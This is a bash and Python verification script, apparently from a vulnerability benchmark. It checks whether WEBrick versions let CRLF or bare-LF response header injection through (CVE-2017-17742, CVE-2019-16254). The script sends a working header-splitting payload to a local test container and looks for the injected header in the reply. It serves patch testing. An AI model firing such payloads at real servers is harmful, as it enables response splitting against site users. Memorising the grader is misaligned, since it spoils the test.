#!/usr/bin/env bash
# verify.sh for PCBV2-0029 webrick-crlf-2017-17742-2019-16254
# Flag channel = RAW response bytes: the probe embeds the per-run RUN_FLAG into the
# header-injection payload; it materialises as an injected response header line
# (X-Pcb-Injected: <flag>) ONLY when WEBrick's version-specific check_header ACCEPTS
# the control-char-bearing value and writes it to the socket.
#   --seed     : CVE-2017-17742 full CRLF (\r\n) pair  -> V0 (2.5.0, no check) splits;
#                V1 (2.5.1, /\r\n/) raises InvalidHeader -> 500, no flag.
#   --residual : CVE-2019-16254 isolated LF (\n)        -> /\r\n/ does NOT match on V1
#                -> value written unchanged -> split lands -> flag (closed on V2 /[\r\n]/).
# 0=效果发生 10=未发生 20=环境失败 30=参数错误
set -uo pipefail
: "${RUN_ID:?}" "${COMPOSE_PROJECT_NAME:?}" "${RUN_FLAG:?}" "${VERSION:?}" "${WORK_DIR:?}"
MODE="${1:-}"
[[ "$MODE" == "--seed" || "$MODE" == "--residual" ]] || { echo "usage: --seed|--residual" >&2; exit 30; }
CASE_DIR="$(cd "$(dirname "$0")/.." && pwd)"
PY="${PCB_PYTHON:-python3}"
REF="${RUN_FLAG_REF:-$RUN_FLAG}"
JUDGE_FLAG="${RUN_FLAG_REF:-$RUN_FLAG}"   # 判定基准：RUN_FLAG_REF，回退 RUN_FLAG
mkdir -p "$WORK_DIR"

PORT="$(docker compose -p "$COMPOSE_PROJECT_NAME" --project-directory "$CASE_DIR" \
        port "$VERSION" 8080 2>/dev/null | sed -E 's/.*:([0-9]+)$/\1/' | tr -d '[:space:]' | tail -1)"
if [[ -z "$PORT" ]]; then
  echo "cannot resolve $VERSION:8080 for project $COMPOSE_PROJECT_NAME" >&2
  exit 20
fi
echo "target: 127.0.0.1:$PORT version=$VERSION mode=$MODE"

OUT="$("$PY" - "$PORT" "$MODE" "$RUN_FLAG" "$REF" <<'PYEOF'
import json, socket, sys
from urllib.parse import quote

port = int(sys.argv[1]); mode = sys.argv[2]
inject = sys.argv[3]        # RUN_FLAG: injected into the probe (per-run token)
ref = sys.argv[4]           # RUN_FLAG_REF: verdict baseline

if mode == "--seed":
    sep = "\r\n"            # full CRLF pair -> matches V1's /\r\n/ check
else:
    sep = "\n"              # isolated LF -> slips past /\r\n/ on V1 (CVE-2019-16254)

value = "pcbseed" + sep + "X-Pcb-Injected: " + inject
path = "/?x=" + quote(value, safe="")
req = (
    "GET " + path + " HTTP/1.1\r\n"
    "Host: 127.0.0.1:" + str(port) + "\r\n"
    "Connection: close\r\n"
    "\r\n"
).encode("latin-1")

try:
    s = socket.create_connection(("127.0.0.1", port), timeout=10)
except OSError as e:
    print(json.dumps({"error": f"connect: {e}"}))
    sys.exit(20)
s.settimeout(12)
buf = b""
try:
    s.sendall(req)
    while True:
        try:
            c = s.recv(4096)
        except socket.timeout:
            break
        if not c:
            break
        buf += c
        if len(buf) > 65536:
            break
except OSError:
    pass
finally:
    s.close()
body = buf.decode("latin-1")
status = body.split("\r\n", 1)[0] if body else ""
print(json.dumps({"status": status, "flag_seen": ref in body, "body_head": body[:300]}))

if ref in body:
    sys.exit(0)      # injected line reached the client -> effect observed
if status.startswith("HTTP/1.1 500"):
    sys.exit(10)     # InvalidHeader -> 500 -> blocked
sys.exit(10)         # otherwise not observed
PYEOF
)"
RC=$?
echo "$OUT" | head -c 600; echo
exit "$RC"
